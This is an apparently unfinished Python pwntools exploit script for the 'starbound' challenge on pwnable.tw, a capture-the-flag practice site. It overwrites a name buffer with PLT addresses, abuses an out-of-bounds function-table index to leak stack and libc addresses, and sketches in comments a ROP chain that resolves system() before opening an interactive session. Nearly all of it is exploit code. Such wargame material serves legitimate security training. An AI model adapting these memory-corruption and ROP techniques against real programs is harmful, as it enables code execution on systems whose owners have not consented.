from pwn import *

puts_got = 0x0805509c
player = 0x080580D0
fn_call = 0x08058154
after_call_addr = 0x804a664
ret_gadg = 0x08048e48
#got a bof but unable to return from the function
#r = remote('chall.pwnable.tw',10202)
r = process("./starbound")
bin_ = ELF("./starbound")
libc = ELF('./libc_32.so.6')
context.arch = "i386"
context.log_level = "error"

def over_name(over):
	r.sendlineafter('>',str(6))
	r.sendlineafter('>',str(2))
	r.sendlineafter('Enter your name:',over)
	r.sendlineafter('>',str(1))
	#r.sendlineafter('>',str(3))
over_name(p32(bin_.plt['puts']))
# list of fn calls at fn_call and idx 
#stores which fn to call... passing idx to call custom function stored at .bss name
idx = -fn_call+player 


#getting the stack leak
r.sendafter('>',str(idx/4))
leak = u32(r.recvline()[5:9])
print(hex(leak))
ebp = leak + 0x58
#getting the libc leak
#rop_addr =
#
#rop_chain =p32(bin_.plt['puts'])+p32(after_call_addr)+p32(puts_got)
#r.sendafter('>',str(idx/4)+'aa'+rop_chain)
#payload = p32(bin_.plt['puts']) + 'a'*4 +rop_chain
#getting linc leak
over_name(p32(bin_.plt['write']))
gdb.attach(r)
r.sendafter('>',str(idx/4))
#gdb.attach(r)
#
#print(r.recvline().encode("hex"))
'''
base = libc_leak - 0x2132d
system = base + libc.symbols['system']
print(hex(libc_leak))
print(hex(base))
print(hex(system))
'''
#r.sendlineafter()
r.interactive()